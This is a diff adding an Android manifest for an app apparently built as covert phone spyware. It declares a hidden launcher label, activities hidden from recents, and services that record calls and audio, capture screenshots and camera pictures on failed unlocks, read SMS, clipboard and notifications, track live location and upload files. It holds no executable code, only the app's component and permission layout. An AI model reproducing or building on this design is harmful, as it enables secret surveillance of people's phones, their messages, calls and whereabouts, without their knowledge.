@@ -1,0 +1,203 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.phone.mobile_2019" platformBuildVersionCode="400" platformBuildVersionName="140">
+    <uses-permission android:name="android.permission.READ_CALENDAR"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.FLASHLIGHT" android:permissionGroup="android.permission-group.HARDWARE_CONTROLS" android:protectionLevel="normal" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera2.full" android:required="false"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
+    <uses-permission android:name="android.permission.REBOOT"/>
+    <uses-permission android:name="android.permission.MOUNT_FORMAT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"/>
+    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <application android:allowBackup="false" android:icon="@mipmap/ic_launcher" android:label="@string/name_hide_app" android:largeHeap="true" android:manageSpaceActivity="com.app.activity.FirstActivity" android:name="com.app.activity.MyApp" android:theme="@style/AppTheme">
+        <meta-data android:name="firebase_crashlytics_collection_enabled" android:value="false"/>
+        <meta-data android:name="firebase_analytics_collection_enabled" android:value="false"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+        <activity android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:launchMode="singleInstance" android:name="com.app.activity.FirstActivity" android:noHistory="true" android:taskAffinity="">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:launchMode="singleInstance" android:name="com.app.activity.MainActivity" android:taskAffinity="" android:windowSoftInputMode="stateAlwaysHidden|adjustResize">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.BROWSABLE"/>
+                <data android:host="mobile-app-start-app.com" android:pathPattern="/openapp" android:scheme="https"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:launchMode="singleInstance" android:name="com.app.activity.PresentationActivity" android:noHistory="true" android:taskAffinity="" android:windowSoftInputMode="stateAlwaysHidden|adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:launchMode="singleInstance" android:name="com.app.activity.CheckingWarningActivity" android:noHistory="true" android:taskAffinity="" android:windowSoftInputMode="stateAlwaysHidden|adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:name="com.app.activity.ConfigPhoneActivity" android:taskAffinity="" android:windowSoftInputMode="stateAlwaysHidden|adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:name="com.app.activity.SettingsActivity" android:parentActivityName="com.app.activity.MainActivity" android:taskAffinity="" android:windowSoftInputMode="adjustResize">
+            <meta-data android:name="android.support.PARENT_ACTIVITY" android:value="com.app.activity.MainActivity"/>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:name="com.app.activity.SettingsFixAppActivity" android:parentActivityName="com.app.activity.MainActivity" android:taskAffinity="" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:icon="@mipmap/logo" android:label="@string/app_name" android:name="com.app.activity.SettingsFixOppoAppActivity" android:parentActivityName="com.app.activity.MainActivity" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:name="com.app.activity.ActivityUnLockApp" android:parentActivityName="com.app.activity.MainActivity" android:taskAffinity="" android:theme="@style/Theme.Transparent" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:launchMode="singleInstance" android:name="com.app.activity.CreateAccountActivity" android:taskAffinity="" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@mipmap/logo" android:label="@string/app_name" android:launchMode="singleInstance" android:name="com.app.activity.LoginActivity" android:taskAffinity="" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.app.activity.BugAllActivity" android:noHistory="true" android:taskAffinity="" android:theme="@style/Theme.Transparent" android:windowSoftInputMode="stateAlwaysHidden|adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.activity.ActivityRestriction" android:noHistory="true" android:taskAffinity="" android:windowSoftInputMode="stateAlwaysHidden|adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.action.ActivityMessage" android:taskAffinity="" android:theme="@style/Theme.Transparent" android:windowSoftInputMode="stateAlwaysHidden|adjustResize"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.activity.ScreenshotActivity" android:taskAffinity="" android:theme="@style/Theme.Transparent"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.activity.ScreenActivity" android:taskAffinity="" android:theme="@style/Theme.Transparent"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.action.picture.ActivityPicture" android:taskAffinity="" android:theme="@style/Theme.Transparent"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.action.picture.ActivityPictureCamera2" android:taskAffinity="" android:theme="@style/Theme.Transparent"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.action.picture.ActivityPicturePasswordFailed" android:taskAffinity="" android:theme="@style/Theme.Transparent"/>
+        <activity android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.action.picture.ActivityPicturePasswordFailedCamera2" android:taskAffinity="" android:theme="@style/Theme.Transparent"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.action.AndroidTextToSpeechActivity" android:taskAffinity="" android:theme="@style/Theme.Transparent" android:windowSoftInputMode="stateAlwaysHidden|adjustResize"/>
+        <activity android:configChanges="orientation|screenSize" android:icon="@drawable/ic_notif" android:launchMode="singleInstance" android:name="com.app.activity.liveRTC.LiveRTCActivity" android:taskAffinity="" android:theme="@style/Theme.Transparent"/>
+        <receiver android:name="com.app.received.AllReceived"/>
+        <receiver android:name="com.app.received.AppsReceived">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.app.received.BootReceived">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.app.received.CallReceived">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PHONE_STATE"/>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.app.received.ConnectionChangeReceived"/>
+        <receiver android:name="com.app.received.ScreenOFFReceived"/>
+        <receiver android:name="com.app.received.LocationReceived"/>
+        <receiver android:name="com.app.received.PolicyActivate$PolicyAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.ACTION_PASSWORD_FAILED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.app.received.SMSReceived">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.app.received.StopLocLive"/>
+        <receiver android:name="com.app.received.IMRootReceived"/>
+        <receiver android:name="com.app.received.AppsUsageTimeAlarmReceived"/>
+        <service android:name="com.app.service.Localization"/>
+        <service android:name="com.app.service.ServiceObserver"/>
+        <service android:name="com.app.service.ServiceLoc"/>
+        <service android:name="com.app.service.ServiceLocDashboard"/>
+        <service android:name="com.app.service.ServiceLocalization"/>
+        <service android:name="com.app.service.AudioRecordService"/>
+        <service android:name="com.app.service.RecordCallService"/>
+        <service android:name="com.app.service.LocLive"/>
+        <service android:name="com.app.service.ClipboardSerivce"/>
+        <service android:name="com.app.service.UploadCallService"/>
+        <service android:name="com.app.service.UploadDataService"/>
+        <service android:name="com.app.service.GetDataRootService"/>
+        <service android:name="com.app.service.UploadRecordAudioService"/>
+        <service android:name="com.app.service.UploadScreenService"/>
+        <service android:name="com.recorder.call.services.NService"/>
+        <service android:name="com.app.service.ServiceScreenshotRoot"/>
+        <service android:name="com.app.service.ServiceScreenshotRemoteRoot"/>
+        <service android:name="com.app.service.UploadScreenRemoteService"/>
+        <service android:name="com.app.service.ServiceScreenshotAuto"/>
+        <service android:name="com.app.service.ServiceUpdateInfoDashboard"/>
+        <service android:name="com.app.service.ServiceCheckSettings"/>
+        <service android:name="com.app.service.UploadPictureRemoteService" android:process=":uploaddpicture"/>
+        <service android:name="com.app.service.FileExplorerRemote" android:process=":fileexplorer"/>
+        <service android:name="com.app.service.UploadDataFileExplorer" android:process=":fileexplorerupload"/>
+        <service android:name="com.app.service.MyFcmListenerServiceMTF">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <service android:name="com.app.service.MyInstanceIDListenerServiceMTF">
+            <intent-filter>
+                <action android:name="com.google.firebase.INSTANCE_ID_EVENT"/>
+            </intent-filter>
+        </service>
+        <service android:enabled="true" android:name="com.app.service.NotificationListener" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService"/>
+            </intent-filter>
+        </service>
+        <service android:enabled="true" android:label="@string/app_name_accessibility" android:name="com.app.service.AccessibilityServiceMTF" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service"/>
+        </service>
+        <provider android:authorities="com.phone.mobile_2019.fileprovider" android:exported="false" android:grantUriPermissions="true" android:name="android.support.v4.content.FileProvider">
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
+        </provider>
+        <provider android:authorities="com.phone.mobile_2019.crashlyticsinitprovider" android:exported="false" android:initOrder="90" android:name="com.crashlytics.android.CrashlyticsInitProvider"/>
+        <service android:exported="true" android:name="com.google.firebase.messaging.FirebaseMessagingService">
+            <intent-filter android:priority="-500">
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <service android:exported="false" android:name="com.google.firebase.components.ComponentDiscoveryService">
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.iid.Registrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+        </service>
+        <receiver android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementReceiver"/>
+        <receiver android:enabled="true" android:exported="true" android:name="com.google.android.gms.measurement.AppMeasurementInstallReferrerReceiver" android:permission="android.permission.INSTALL_PACKAGES">
+            <intent-filter>
+                <action android:name="com.android.vending.INSTALL_REFERRER"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementService"/>
+        <service android:enabled="true" android:exported="false" android:name="com.google.android.gms.measurement.AppMeasurementJobService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdService">
+            <intent-filter android:priority="-500">
+                <action android:name="com.google.firebase.INSTANCE_ID_EVENT"/>
+            </intent-filter>
+        </service>
+        <provider android:authorities="com.phone.mobile_2019.firebaseinitprovider" android:exported="false" android:initOrder="100" android:name="com.google.firebase.provider.FirebaseInitProvider"/>
+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+    </application>
+</manifest>
